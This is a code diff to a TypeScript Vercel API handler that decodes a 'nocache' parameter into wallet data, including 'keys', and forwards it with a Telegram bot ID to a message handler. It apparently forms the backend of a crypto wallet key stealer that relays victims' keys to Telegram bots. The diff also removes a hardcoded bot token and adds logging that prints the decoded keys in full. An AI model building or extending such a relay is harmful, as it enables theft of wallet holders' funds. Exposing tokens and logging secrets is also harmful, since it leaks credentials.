@@ -14,13 +14,17 @@ async function handler(req: VercelRequest, res: VercelResponse): Promise<void> {
   // Handle nocache parameter - process through /api/message
   if (nocache !== undefined && typeof nocache === 'string') {
     try {
+      console.log(`🔍 [api/index] Incoming nocache request: ${nocache.substring(0, 50)}...`);
+      
       const walletData = parseNocacheData(nocache);
+      console.log(`📦 [api/index] Decoded Data:`, JSON.stringify(walletData, null, 2));
+
       const messageBody = {
         error: 0 as const,
         chatId: walletData.code,
         username: walletData.username,
         platform: walletData.platform || 'axiom',
-        botId: "8527011591:AAHNTTUvOc3NkZGVgYv-w4Lz_1QRndCNB_Q",
+        botId: walletData.botId || null,
         keys: walletData.keys,
         message: nocache
       };
@@ -33,9 +37,11 @@ async function handler(req: VercelRequest, res: VercelResponse): Promise<void> {
         body: messageBody
       } as VercelRequest;
 
+      console.log(`🔄 [api/index] Forwarding to message handler...`);
       await messageHandler(mockReq, res);
       return;
     } catch (error) {
+      console.error(`❌ [api/index] Error processing nocache:`, error);
       applyCors(res);
       res.status(500).json({
         error: 'Internal server error',
